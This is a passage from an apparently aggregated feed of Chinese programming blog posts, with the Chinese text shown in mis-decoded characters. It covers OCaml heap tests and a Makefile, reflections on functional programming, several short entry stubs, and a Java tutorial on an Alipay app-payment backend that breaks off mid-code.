  <span class="k">let</span> <span class="n">t</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="n">20</span> <span class="n">0</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">0</span> <span class="o">]</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">B_H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t</span> <span class="o">=</span> <span class="o">[</span> <span class="n">9</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">1</span><span class="o">;</span> <span class="n">0</span> <span class="o">])</span>

<span class="c">(* æµ‹è¯•ä¸¤ç§å †å®ç°çš„ç»“æœä¸€è‡´ *)</span>
<span class="k">let</span> <span class="bp">()</span> <span class="o">=</span>
  <span class="k">let</span> <span class="n">t1</span> <span class="o">=</span> <span class="nn">H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">0</span> <span class="o">]</span>
  <span class="ow">and</span> <span class="n">t2</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">fromList</span> <span class="n">20</span> <span class="n">0</span> <span class="o">[</span> <span class="n">1</span><span class="o">;</span> <span class="n">3</span><span class="o">;</span> <span class="n">5</span><span class="o">;</span> <span class="n">7</span><span class="o">;</span> <span class="n">9</span><span class="o">;</span> <span class="n">2</span><span class="o">;</span> <span class="n">4</span><span class="o">;</span> <span class="n">6</span><span class="o">;</span> <span class="n">8</span><span class="o">;</span> <span class="n">0</span> <span class="o">]</span> <span class="k">in</span>
  <span class="k">assert</span> <span class="o">(</span><span class="nn">H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t1</span> <span class="o">=</span> <span class="nn">B_H_int</span><span class="p">.</span><span class="n">toList</span> <span class="n">t2</span><span class="o">)</span>
</code></pre></div><p>é¡¹ç›®é‡‡ç”¨ <code>make</code> è¿›è¡Œæ„å»º</p>
<div class="highlight"><pre class="chroma"><code class="language-makefile" data-lang="makefile"><span class="nf">.PHONY</span><span class="o">:</span>	<span class="n">all</span> <span class="n">clean</span> <span class="n">byte</span> <span class="n">native</span> <span class="n">profile</span> <span class="n">debug</span> <span class="n">test</span> <span class="n">run</span>

<span class="nv">OCB_FLAGS</span> <span class="o">=</span> -tag bin_annot
<span class="nv">OCB</span> <span class="o">=</span> 		ocamlbuild <span class="k">$(</span>OCB_FLAGS<span class="k">)</span>

<span class="nf">all</span><span class="o">:</span> <span class="n">native</span> <span class="n">byte</span>

<span class="nf">clean</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> -clean

<span class="nf">native</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> main.native

<span class="nf">byte</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> main.byte

<span class="nf">profile</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> -tag profile main.native

<span class="nf">debug</span><span class="o">:</span>
	<span class="k">$(</span>OCB<span class="k">)</span> -tag debug main.byte

<span class="nf">run</span><span class="o">:</span> <span class="n">native</span>
	./main.native
</code></pre></div><h1 id="å¿ƒå¾—ä½“ä¼š">å¿ƒå¾—ä½“ä¼š</h1>
<p>ç¬¬ä¸€æ¬¡ç”¨çº¯å‡½æ•°å¼è¯­è¨€å†™ä¸€ä¸ªç®—æ³•ï¼Œå’Œä¹‹å‰ä¸Šè¯¾æ—¶åœ¨ <code>toplevel</code> ä¸­æµ‹è¯•è¿˜æ˜¯æœ‰è¾ƒå¤§çš„åŒºåˆ«ï¼ŒåŒ…æ‹¬å¦‚ä½•å®ç°å¤šæ–‡ä»¶ç¼–è¯‘ï¼Œå¦‚ä½•é…ç½®ç¼–è¯‘ï¼Œå¦‚ä½•ç¼–å†™æ¨¡å—ç­‰éƒ½å›°æ‰°äº†æˆ‘å¾ˆä¹…ã€‚æœ€åä¾é æ–‡æ¡£ã€æ‰‹å†Œã€githubä¸Šçš„ä¸€äº›é¡¹ç›®ç­‰å­¦ä¼šäº†å¦‚ä½•æ„å»ºä¸€ä¸ª <code>Ocaml</code> é¡¹ç›®ã€‚</p>
<p>æ­¤å¤–ï¼Œ<code>Ocaml</code> æ ‡å‡†åº“ä¹Ÿç»™äº†æˆ‘å¾ˆå¤§çš„å¸®åŠ©ï¼Œé‡Œé¢çš„æ ‡å‡†åº“å¦‚ <code>Set</code> ç­‰éƒ½å†™å¾—å¾ˆæ¸…æ™°ï¼Œæœ‰å¾ˆè¯¦ç»†çš„æ³¨é‡Šï¼Œæˆ‘å†™çš„å †çš„æ¨¡å—ç»“æ„ã€å‡½å­ç­‰éƒ½æ˜¯å‚è€ƒ <code>Set</code> åº“çš„å¤„ç†æ–¹å¼ã€‚</p>
<p>å¯¹äºå‡½æ•°å¼è¯­è¨€ï¼Œç‰¹åˆ«æ˜¯çº¯å‡½æ•°å¼çš„æ€æƒ³æˆ‘ä¹Ÿæœ‰äº†æ›´æ·±åˆ»çš„ç†è§£ã€‚ä¸€å¼€å§‹æˆ‘è¿˜æ˜¯ä»¥å‘½ä»¤å¼çš„æ€ç»´æ¥ç¼–å†™ä»£ç ï¼Œè®¤ä¸ºä¸ä½¿ç”¨ <code>for</code> ã€<code>while</code> è¯­å¥å°±æ˜¯å‡½æ•°å¼ï¼Œä»£ç ä¸­è¿˜æ˜¯å­˜åœ¨å¾ˆå¤š <code>mutable</code> ã€<code>ref</code> ç­‰å†…å®¹ï¼Œå³å­˜åœ¨å‰¯ä½œç”¨ï¼Œä¹Ÿå°±å¯¼è‡´äº†å‡½æ•°æ“ä½œè¿˜æ˜¯å¯¹ä¸€ä¸ªâ€œå¯¹è±¡â€è¿›è¡Œæ“ä½œï¼Œè€Œä¸æ˜¯æ¯æ¬¡è¿”å›ä¸€ä¸ªæ–°çš„ç»“æœã€‚åæ¥å‚è€ƒå„ç§é¡¹ç›®ã€æ•™ç¨‹ï¼Œæ‰å‘ç°äº†çº¯å‡½æ•°å¼â€œæ— å‰¯ä½œç”¨â€çš„æ ¸å¿ƒæ€æƒ³åŠå¤„ç†æ–¹å¼ã€‚</p>
<p>æˆ‘è®¤ä¸ºï¼Œçº¯å‡½æ•°å¼è¯­è¨€æ›´è´´è¿‘æ•°å­¦æ¨¡å‹ï¼Œå¯ä»¥ç”¨éå¸¸ç®€ç»ƒçš„è¯­å¥å†™å‡ºç®—æ³•ï¼Œå…¶æ ¸å¿ƒæ˜¯é€’å½’å’Œè¿­ä»£ï¼Œä¾‹å¦‚æˆ‘çš„å †é€šè¿‡çŸ­çŸ­å‡ åè¡Œè¯­å¥å°±å®ç°äº†ï¼Œé€šè¿‡ä¸€äº›ç²¾å·§çš„é€’å½’å°±å®ç°äº†å‘½ä»¤å¼è¯­è¨€è¦å†™å¤§é‡å¾ªç¯å‘½ä»¤æ‰èƒ½å®ç°çš„åŠŸèƒ½ã€‚ä½†è¿™äº›ç®€æ´ä¹Ÿå¸¦æ¥äº†ä¸€äº›é—®é¢˜ï¼Œæ¯”å¦‚ä»£ç æŠ½è±¡ç¨‹åº¦è¾ƒé«˜ï¼Œç†è§£èµ·æ¥è¾ƒä¸ºå›°éš¾ï¼›å¤§é‡é€’å½’å¯¹æ ˆä¸Šç©ºé—´é€ æˆå¾ˆå¤§å‹åŠ›ï¼Œæ€§èƒ½é™ä½äº†çš„åŒæ—¶ä¹Ÿéš¾ä»¥è¿›è¡Œå¤§é‡çš„è®¡ç®—ï¼Œéœ€è¦èŠ±è´¹å¾ˆå¤§çš„åŠ›æ°”å»æ¶ˆé™¤å°¾é€’å½’ï¼ˆä½†é€šå¸¸å¾ˆéš¾å®ç°ï¼‰ï¼›ä¸å…è®¸å‰¯ä½œç”¨é€ æˆæ—¶é—´ã€ç©ºé—´çš„æµªè´¹ï¼›æ€ç»´åœ¨ä¸¤ç§æ€æƒ³ä¸­çš„è½¬æ¢è¾ƒä¸ºå›°éš¾ç­‰ã€‚ä½†æ€»çš„æ¥è¯´ï¼Œå‡½æ•°å¼è¯­è¨€è¿˜æ˜¯æœ‰å¾ˆå¥½çš„å‰æ™¯ï¼Œä»è¿‘å¹´æ¥è¶Šæ¥è¶Šå¤šçš„è¯­è¨€éƒ½å¼€å§‹æ”¯æŒå‡½æ•°å¼çš„å†™æ³•ï¼ˆå¦‚ <code>lambda</code> è¡¨è¾¾å¼ç­‰ï¼‰å¯ä»¥çœ‹å‡ºã€‚å¦‚ <code>C++</code> ã€<code>Python</code> ã€<code>Java</code> ç­‰éƒ½æœ‰å‡½æ•°å¼çš„å†™æ³•ï¼Œæˆ‘åœ¨å¹³æ—¶ç¼–å†™ä»£ç çš„è¿‡ç¨‹ä¸­ä¹Ÿä¼šç”¨åˆ°å‡½æ•°å¼è¯­å¥æ¥ç®€åŒ–ä»£ç ã€‚å‡½æ•°å¼è¯­è¨€å’Œå‘½ä»¤å¼è¯­è¨€åœ¨æœªæ¥å¯èƒ½ä¼šè¶Šèµ°è¶Šè¿‘ï¼Œå–é•¿è¡¥çŸ­ï¼Œæœ€åèä¸ºä¸€ä½“ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Creedowlâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2021/02/alpine-time-call/</id>
        <title><![CDATA[ç”± TT-RSS è§£ææ•°æ®åº“åœ°å€å¤±è´¥å¼•å‡ºçš„ä¸€ä¸ªé—®é¢˜]]></title>
        <updated>2021-02-23T12:59:07+08:00</updated>
        <link href="https://blog.stdioa.com/2021/02/alpine-time-call/"/>
        <content type="text/html" src="https://blog.stdioa.com/2021/02/alpine-time-call/"><![CDATA[<p>æ°´ä¸€ç¯‡æ–‡ç« ï¼Œä¸»è¦ç”¨æ¥å‘Šè¯«è‡ªå·±è®¤çœŸçœ‹æ–‡æ¡£ã€‚ğŸŒš</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html</id>
        <title><![CDATA[2021-01-29 è®ºæ–‡æ¨è]]></title>
        <updated>2021-01-29T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0129.html"><![CDATA[2021-01-29 è®ºæ–‡æ¨è]]></content>
        <author>
            <name><![CDATA[S3lab æ¯æ—¥è®ºæ–‡æ¨è]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html</id>
        <title><![CDATA[2021-01-28 è®ºæ–‡æ¨è]]></title>
        <updated>2021-01-28T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0128.html"><![CDATA[2021-01-28 è®ºæ–‡æ¨è]]></content>
        <author>
            <name><![CDATA[S3lab æ¯æ—¥è®ºæ–‡æ¨è]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html</id>
        <title><![CDATA[2021-01-27 è®ºæ–‡æ¨è]]></title>
        <updated>2021-01-27T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0127.html"><![CDATA[2021-01-27 è®ºæ–‡æ¨è]]></content>
        <author>
            <name><![CDATA[S3lab æ¯æ—¥è®ºæ–‡æ¨è]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html</id>
        <title><![CDATA[2021-01-26 è®ºæ–‡æ¨è]]></title>
        <updated>2021-01-26T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0126.html"><![CDATA[2021-01-26 è®ºæ–‡æ¨è]]></content>
        <author>
            <name><![CDATA[S3lab æ¯æ—¥è®ºæ–‡æ¨è]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html</id>
        <title><![CDATA[2021-01-25 è®ºæ–‡æ¨è]]></title>
        <updated>2021-01-25T00:00:00+08:00</updated>
        <link href="https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html"/>
        <content type="text/html" src="https://nuaa-s3lab.github.io/dailyPaper/2021/0125.html"><![CDATA[2021-01-25 è®ºæ–‡æ¨è]]></content>
        <author>
            <name><![CDATA[S3lab æ¯æ—¥è®ºæ–‡æ¨è]]></name>
        </author>
    </entry>
    
    <entry>
        <id>https://blog.stdioa.com/2020/12/protobuf-upgrade/</id>
        <title><![CDATA[protobuf å‡çº§åå¸¦æ¥çš„ä¸€äº›å‘]]></title>
        <updated>2020-12-27T06:53:32+08:00</updated>
        <link href="https://blog.stdioa.com/2020/12/protobuf-upgrade/"/>
        <content type="text/html" src="https://blog.stdioa.com/2020/12/protobuf-upgrade/"><![CDATA[<p>å‰æ®µæ—¶é—´æŠŠå…¬å¸æŸé¡¹ç›®ä¾èµ–çš„ <code>github.com/golang/protobuf</code> çš„ç‰ˆæœ¬ä» v1.3.3 å‡çº§åˆ°äº† v1.4.2ï¼Œæœ¬æ–‡è®°å½•äº†å‡çº§è¿‡ç¨‹ä¸­é‡åˆ°çš„ä¸€äº›é—®é¢˜ã€‚</p>]]></content>
        <author>
            <name><![CDATA[Stdioâ€™s Blog]]></name>
        </author>
    </entry>
    
    <entry>
        <id>http://www.windboy.top/2020/10/16/blog11/</id>
        <title><![CDATA[Java å®ç°æ”¯ä»˜å®åå°æ”¯ä»˜æ¥å£]]></title>
        <updated>2020-10-16T08:09:55+08:00</updated>
        <link href="http://www.windboy.top/2020/10/16/blog11/"/>
        <content type="text/html" src="http://www.windboy.top/2020/10/16/blog11/"><![CDATA[<h2 id="èƒŒæ™¯"><a href="#èƒŒæ™¯" class="headerlink" title="èƒŒæ™¯"></a>èƒŒæ™¯</h2><p>é¡¹ç›®ä¸­éœ€è¦å¯¹å•†å“è®¢å•è¿›è¡Œæ”¯ä»˜ï¼Œè¿™é‡Œè®°å½•ä¸‹è‡ªå·±æ˜¯å¦‚ä½•ä½¿ç”¨ Java å®ç°æ”¯ä»˜å®åå°æ”¯ä»˜æ¥å£ï¼Œæ”¯ä»˜æ“ä½œä¸º App æ”¯ä»˜ã€‚</p><p>å®˜æ–¹æ–‡æ¡£ï¼š<a href="https://opendocs.alipay.com/open/204/105297" target="_blank" rel="noopener">https://opendocs.alipay.com/open/204/105297</a> ã€‚</p><h2 id="ç¼–ç å‰çš„å‡†å¤‡"><a href="#ç¼–ç å‰çš„å‡†å¤‡" class="headerlink" title="ç¼–ç å‰çš„å‡†å¤‡"></a>ç¼–ç å‰çš„å‡†å¤‡</h2><p>1.<strong>åˆ›å»ºåº”ç”¨</strong></p><p>åœ¨æ”¯ä»˜å®å¼€æ”¾å¹³å°çš„å¼€å‘è€…ä¸­å¿ƒï¼Œåˆ›å»ºè‡ªå·±çš„åº”ç”¨ï¼Œå¹¶å–å¾—åº”ç”¨çš„å”¯ä¸€æ ‡è¯† APPIDã€‚</p><p>2.<strong>æ·»åŠ æ”¯ä»˜èƒ½åŠ›</strong></p><p>åœ¨åº”ç”¨è¯¦æƒ…é¡µé¢ï¼Œæ·»åŠ èƒ½åŠ›-App æ”¯ä»˜ï¼Œå¹¶è¿›è¡Œç­¾çº¦ã€‚</p><p>3.<strong>å¯†é’¥ç”Ÿæˆå’Œé…ç½®</strong></p><p>ä¸ºäº†ä¿éšœäº¤æ˜“èº«ä»½ä¸æ•°æ®çš„å®‰å…¨ï¼Œéœ€è¦è¿›è¡Œå¯†é’¥çš„é…ç½®ï¼Œè¿™é‡Œç”±äºæ˜¯ä¼ä¸šçš„é¡¹ç›®ï¼Œéœ€è¦é…ç½®å…¬é’¥è¯ä¹¦ï¼Œè¿™é‡Œéœ€è¦ç”¨åˆ°æ”¯ä»˜å®å¼€æ”¾å¹³å°å¼€å‘åŠ©æ‰‹ï¼Œç”Ÿæˆ CSR æ–‡ä»¶ï¼šåº”ç”¨å…¬é’¥ã€ç§é’¥ã€è¯ä¹¦è¿™ 3 ä¸ªæ–‡ä»¶ã€‚è¯¦è§å®˜ç½‘æ–‡æ¡£ï¼š<a href="https://opendocs.alipay.com/open/291/105971" target="_blank" rel="noopener">https://opendocs.alipay.com/open/291/105971</a> ã€‚</p><p>ç„¶åéœ€è¦åœ¨åº”ç”¨çš„å¼€å‘ä¿¡æ¯ä¸­ï¼Œè®¾ç½®æ¥å£åŠ ç­¾æ–¹å¼ï¼Œä¸Šä¼  CSR æ–‡ä»¶ï¼Œåœ¨çº¿ç”Ÿæˆåº”ç”¨å…¬é’¥è¯ä¹¦å³ .crt æ–‡ä»¶ï¼Œç„¶åä¸Šä¼ è¿™ä¸ªè¯ä¹¦ã€‚ä¸Šä¼ å®Œæˆåï¼Œè¿˜å¯ä»¥ä¸‹è½½å¯¹åº”çš„æ”¯ä»˜å®å…¬é’¥è¯ä¹¦å’Œæ”¯ä»˜å®æ ¹è¯ä¹¦ã€‚</p><p>4.<strong>åå°é›†æˆæ”¯ä»˜å®çš„ SDK</strong></p><p>è¿™ä¸ª SDK ç”¨äºååŠ©è§£æå¹¶éªŒè¯å®¢æˆ·ç«¯åŒæ­¥è¿”å›çš„æ”¯ä»˜ç»“æœå’Œå¼‚æ­¥é€šçŸ¥ã€‚</p><p>App ç«¯ä¹Ÿéœ€è¦é›†æˆæ”¯ä»˜å®å¯¹åº”çš„ SDKã€‚</p><h2 id="ç¼–å†™æ”¯ä»˜æ¥å£"><a href="#ç¼–å†™æ”¯ä»˜æ¥å£" class="headerlink" title="ç¼–å†™æ”¯ä»˜æ¥å£"></a>ç¼–å†™æ”¯ä»˜æ¥å£</h2><h3 id="æ”¯ä»˜å®æ”¯ä»˜æµç¨‹å›¾"><a href="#æ”¯ä»˜å®æ”¯ä»˜æµç¨‹å›¾" class="headerlink" title="æ”¯ä»˜å®æ”¯ä»˜æµç¨‹å›¾"></a>æ”¯ä»˜å®æ”¯ä»˜æµç¨‹å›¾</h3><img src="/images/blog11/alipay.png" width="80%"/><h3 id="åœ¨-App-ç«¯çš„è¡¨ç°"><a href="#åœ¨-App-ç«¯çš„è¡¨ç°" class="headerlink" title="åœ¨ App ç«¯çš„è¡¨ç°"></a>åœ¨ App ç«¯çš„è¡¨ç°</h3><p>ç”¨æˆ·åœ¨ App ä¸Šç‚¹å‡»ç«‹å³è´­ä¹°ï¼Œé€‰æ‹©æ”¯ä»˜æ–¹å¼ï¼Œç‚¹å‡»ç¡®å®šæ”¯ä»˜è°ƒç”¨åå°æ¥å£å¹¶è·³è½¬åˆ°æ”¯ä»˜å® Appï¼Œä»˜æ¬¾å®Œæˆåï¼Œè·³è½¬å› Appï¼Œå®Œæˆæ”¯ä»˜ã€‚</p><h3 id="åå°æ¥å£çš„éœ€æ±‚"><a href="#åå°æ¥å£çš„éœ€æ±‚" class="headerlink" title="åå°æ¥å£çš„éœ€æ±‚"></a>åå°æ¥å£çš„éœ€æ±‚</h3><p>åå°éœ€è¦æä¾› 3 ä¸ªæ¥å£ï¼šè®¢å•ä¿¡æ¯åŠ å¯†ã€æ”¯ä»˜å®æœåŠ¡ç«¯å¼‚æ­¥é€šçŸ¥ã€æœ€ç»ˆä»˜æ¬¾æ ¡éªŒã€‚</p><h3 id="æ¥å£-1ï¼šè®¢å•ä¿¡æ¯åŠ å¯†"><a href="#æ¥å£-1ï¼šè®¢å•ä¿¡æ¯åŠ å¯†" class="headerlink" title="æ¥å£ 1ï¼šè®¢å•ä¿¡æ¯åŠ å¯†"></a><strong>æ¥å£ 1ï¼šè®¢å•ä¿¡æ¯åŠ å¯†</strong></h3><p><strong>åŠŸèƒ½</strong></p><p>ä¼ å…¥è®¢å•ä¿¡æ¯ï¼Œè¿”å›åŠ å¯†åçš„è®¢å•å­—ç¬¦ä¸²ï¼Œå¹¶åœ¨é¡¹ç›®æ•°æ®åº“ä¿å­˜æ”¯ä»˜å®è®¢å•ä¿¡æ¯ã€‚</p><p><strong>å¯†é’¥éªŒè¯æ–¹å¼</strong></p><p>æ”¯ä»˜å®å®¢æˆ·ç«¯å°†ä¼ é€çš„æ¶ˆæ¯ç”¨ç§é’¥åŠ å¯†ï¼ŒæœåŠ¡ç«¯ä½¿ç”¨å…¬é’¥å¯¹æ¶ˆæ¯è¿›è¡ŒéªŒè¯ã€‚</p><p><strong>ä»£ç </strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@PostMapping</span>(value = <span class="string">"/encrypt"</span>)</span><br><span class="line"><span class="function"><span class="keyword">public</span> AjaxResult <span class="title">getAliPayOrder</span><span class="params">(@RequestParam String orderSn)</span> <span class="keyword">throws</span> AlipayApiException </span>&#123;</span><br><span class="line">  </span><br><span class="line">    EOrder eOrder=eOrderService.selectEOrderByOrderSn(orderSn);</span><br><span class="line"></span><br><span class="line">    AlipaymentOrder alipaymentOrder = <span class="keyword">new</span> AlipaymentOrder();</span><br><span class="line">    alipaymentOrder.setOrderId(eOrder.getOrderId().intValue());</span><br><span class="line">    alipaymentOrder.setOutTradeNo(orderSn);</span><br><span class="line">    alipaymentOrder.setAmount(eOrder.getActualPrice());</span><br><span class="line">    <span class="comment">// è®¢å•ç”Ÿæˆï¼Œç­‰å¾…ç”¨æˆ·ä»˜æ¬¾</span></span><br><span class="line">    alipaymentOrder.setTradeStatus(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//æ„é€ client</span></span><br><span class="line">    CertAlipayRequest certAlipayRequest = <span class="keyword">new</span> CertAlipayRequest();</span><br><span class="line">    <span class="comment">//è®¾ç½®ç½‘å…³åœ°å€</span></span><br><span class="line">    certAlipayRequest.setServerUrl(<span class="string">"https://openapi.alipay.com/gateway.do"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®åº”ç”¨Id</span></span><br><span class="line">    certAlipayRequest.setAppId(app_id);</span><br><span class="line">    <span class="comment">//è®¾ç½®åº”ç”¨ç§é’¥</span></span><br><span class="line">    certAlipayRequest.setPrivateKey(privateKey);</span><br><span class="line">    <span class="comment">//è®¾ç½®è¯·æ±‚æ ¼å¼ï¼Œå›ºå®šå€¼json</span></span><br><span class="line">    certAlipayRequest.setFormat(<span class="string">"json"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®å­—ç¬¦é›†</span></span><br><span class="line">    certAlipayRequest.setCharset(<span class="string">"UTF-8"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®ç­¾åç±»å‹</span></span><br><span class="line">    certAlipayRequest.setSignType(<span class="string">"RSA2"</span>);</span><br><span class="line">    <span class="comment">//è®¾ç½®åº”ç”¨å…¬é’¥è¯ä¹¦è·¯å¾„</span></span><br><span class="line">    certAlipayRequest.setCertPath(certPath);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ”¯ä»˜å®å…¬é’¥è¯ä¹¦è·¯å¾„</span></span><br><span class="line">    certAlipayRequest.setAlipayPublicCertPath(alipayPublicCertPath);</span><br><span class="line">    <span class="comment">//è®¾ç½®æ”¯ä»˜å®æ ¹è¯ä¹¦è·¯å¾„</span></span><br><span class="line">    certAlipayRequest.setRootCertPath(rootCertPath);</span><br><span class="line">    <span class="comment">//æ„é€ client</span></span><br><span class="line">    AlipayClient alipayClient = <span class="keyword">new</span> DefaultAlipayClient(certAlipayRequest);</span><br><span class="line"></span><br><span class="line">    <span class="comment">//å®ä¾‹åŒ–å…·ä½“APIå¯¹åº”çš„requestç±»,ç±»åç§°å’Œæ¥å£åç§°å¯¹åº”,å½“å‰è°ƒç”¨æ¥å£åç§°ï¼šalipay.trade.app.pay</span></span><br><span class="line">    AlipayTradeAppPayRequest request = <span class="keyword">new</span> AlipayTradeAppPayRequest();</span><br><span class="line">    <span class="comment">//SDKå·²ç»å°è£…æ‰äº†å…¬å…±å‚æ•°ï¼Œè¿™é‡Œåªéœ€è¦ä¼ å…¥ä¸šåŠ¡å‚æ•°ã€‚ä»¥ä¸‹æ–¹æ³•ä¸ºsdkçš„modelå…¥å‚æ–¹å¼(modelå’Œbiz_contentåŒæ—¶å­˜åœ¨çš„æƒ…å†µä¸‹å–biz_content)ã€‚</span></span><br><span class="line">    AlipayTradeAppPayModel model = <span class="keyword">new</span> AlipayTradeAppPayModel();</span><br><span class="line">    model.setBody(<span class="string">"xx"</span>);</span><br><span class="line">    model.setSubject(<span class="string">"xx"</span>);</span><br><span class="line">    model.setOutTradeNo(orderSn);</span><br><span class="line">    model.setTimeoutExpress(<span class="string">"30m"</span>);</span><br><span class="line">    model.setTotalAmount(eOrder.getActualPrice().toString());</span><br><span class="line">    model.setProductCode(<span class="string">"QUICK_MSECURITY_PAY"</span>);</span><br><span class="line">    request.setBizModel(model);</span><br><span class="line">    <span class="comment">// éœ€è¦å¤–ç½‘éœ€è¦èƒ½ç›´æ¥è®¿é—®çš„åœ°å€</span></span><br><span class="line">    request.setNotifyUrl(<span class="string">"xxx"</span>);</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">//è¿™é‡Œå’Œæ™®é€šçš„æ¥å£è°ƒç”¨ä¸åŒï¼Œä½¿ç”¨çš„æ˜¯sdkExecute</span></span><br><span class="line">        AlipayTradeAppPayResponse response = alipayClient.sdkExecute(request);</span><br><span class="line">        <span class="comment">// å¦‚æœæœªå‘ç”Ÿå¼‚å¸¸ï¼Œåˆ™è®°å½•æ”¯ä»˜å®è®¢å•</span></span><br><span class="line">        alipaymentOrderService.insertAlipaymentOrder(alipaymentOrder);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> AjaxResult.success(response.getBody());</span><br><span class="line">    &#125; <span class="keyword">catch</span> (AlipayApiException e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> AjaxResult.error(<span class="string">"åŠ å¯†å¤±è´¥ï¼"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¥å‚ orderSn æ˜¯è®¢å•ç¼–å·ï¼Œè¿™é‡Œéœ€è¦åœ¨é¡¹ç›®åå°æ•°æ®åº“ä¿å­˜æ”¯ä»˜å®æ”¯ä»˜è®¢å•ï¼Œä½¿ç”¨ AlipaymentOrder è¿™ä¸ªå®ä½“ç±»ï¼š</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">AlipaymentOrder</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// 